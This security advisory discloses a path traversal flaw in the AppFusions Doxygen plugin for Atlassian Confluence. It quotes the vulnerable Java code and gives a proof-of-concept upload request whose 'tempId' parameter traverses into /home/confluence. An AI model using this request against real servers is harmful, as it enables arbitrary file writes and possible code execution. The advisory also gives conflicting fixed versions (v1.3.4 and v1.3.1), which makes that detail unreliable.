@@ -1,0 +1,137 @@
+RCE Security Advisory
+https://www.rcesecurity.com
+
+
+1. ADVISORY INFORMATION
+=======================
+Product:        AppFusions Doxygen for Atlassian Confluence
+Vendor URL:     www.appfusions.com
+Type:           Path Traversal [CWE-22]
+Date found:     2016-06-23
+Date published: -
+CVSSv3 Score:   6.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)
+CVE:            -
+
+
+2. CREDITS
+==========
+This vulnerability was discovered and researched by Julien Ahrens from
+RCE Security.
+
+
+3. VERSIONS AFFECTED
+====================
+AppFusions Doxygen for Atlassian Confluence v1.3.0
+older versions may be affected too.
+
+
+4. INTRODUCTION
+===============
+With Doxygen in Confluence, you can embed full-structure code documentation:
+-Doxygen blueprint in Confluence to allow Doxygen archive imports
+-Display documentation from annotated sources such as Java (i.e., JavaDoc),
+ C++, Objective-C, C#, C, PHP, Python, IDL (Corba, Microsoft, and
+UNO/OpenOffice
+ flavors), Fortran, VHDL, Tcl, D in Confluence.
+-Navigation supports code structure (classes, hierarchies, files), element
+ dependencies, inheritance and collaboration diagrams.
+-Search documentation from within Confluence
+-Restrict access to who can see/add what
+-Doxygen in JIRA also available
+
+(from the vendor's homepage)
+
+
+5. VULNERABILITY DETAILS
+========================
+The application offers the functionality to import zipped Doxygen
+documentations via a file upload to make them available within a
+Confluence page. However the application does not properly validate the
+"tempId" parameter, which represents the directory where the contents of
+the uploaded file will be extracted and stored to. This leads to a path
+traversal vulnerability when "/../" sequences are used as part of the
+"tempId" parameter. Since the contents of the uploaded file are
+extracted to the traversed directory, this vulnerability could also lead
+to Remote Code Execution.
+
+In DoxygenUploadServlet.java (lines 63-64) the "tempId" parameter is
+read as part of a GET request to "/plugins/servlet/doxygen/upload" and
+afterwards used in a "getTemporaryDirectory()" call:
+
+String tempId = request.getParameter("tempId");
+String destination =
+this.doxygenManager.getTemporaryDirectory(tempId).getAbsolutePath();
+
+The "getTemporaryDirectory()" function is defined in
+DefaultDoxyGenManager.java (lines 38-41) and constructs a file object
+based on the "java.io.tmpdir" variable, the static string
+"/doxygen-temp/", the user-supplied "tempId" and a file separator in
+between all parts:
+
+public File getTemporaryDirectory(String tempId) {
+    File file = new File(System.getProperty("java.io.tmpdir") +
+File.separator + "doxygen-temp" + File.separator + tempId);
+    return file;
+}
+
+In the subsequent code the uploaded file as represented by the "file"
+HTTP POST parameter to "/plugins/servlet/doxygen/upload" is extracted to
+the directory which was built using the "file" object.
+
+The following Proof-of-Concept triggers this vulnerability by uploading
+a zipped file, which will be extracted to "/home/confluence" by the
+application: 
+
+POST
+/plugins/servlet/doxygen/upload?tempId=/../../../../../../home/confluence
+HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101
+Firefox/46.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Cache-Control: no-cache
+X-Requested-With: XMLHttpRequest
+Content-Length: 966
+Content-Type: multipart/form-data;
+boundary=---------------------------62841490314755966452122422550
+Cookie: doc-sidebar=300px; doxygen_width=256;
+JSESSIONID=75A487B49F38A536358C728B1BE5A9E1
+Connection: close
+
+-----------------------------62841490314755966452122422550
+Content-Disposition: form-data; name="file"; filename="Traversal.zip"
+Content-Type: application/zip
+
+[zipped data]
+-----------------------------98001232218371736091795669059--
+
+
+6. RISK
+=======
+To successfully exploit this vulnerability the attacker must be
+authenticated and must have the rights within Atlassian Confluence to
+upload Doxygen files (default).
+
+The vulnerability allows remote attackers to upload arbitrary files to
+any destination directory writeable by the user of the web server, which
+could lead to Remote Code Execution.
+
+
+7. SOLUTION
+===========
+Update to AppFusions Doxygen for Atlassian Confluence v1.3.4
+
+
+8. REPORT TIMELINE (DD/MM/YYYY)
+===============================
+23/06/2016: Discovery of the vulnerability
+23/06/2016: Notified vendor via public security mail address
+29/06/2016: No response, sent out another notification w/o details
+29/06/2016: Response from vendor who asked for full details
+30/06/2016: Sent over preliminary advisory with full details
+03/07/2016: No response from vendor, sent out a status request
+03/07/2016: Vendor temporarily removes product from website
+11/07/2016: Vendor releases v1.3.1 which fixes the issue
+20/11/2016: Advisory released
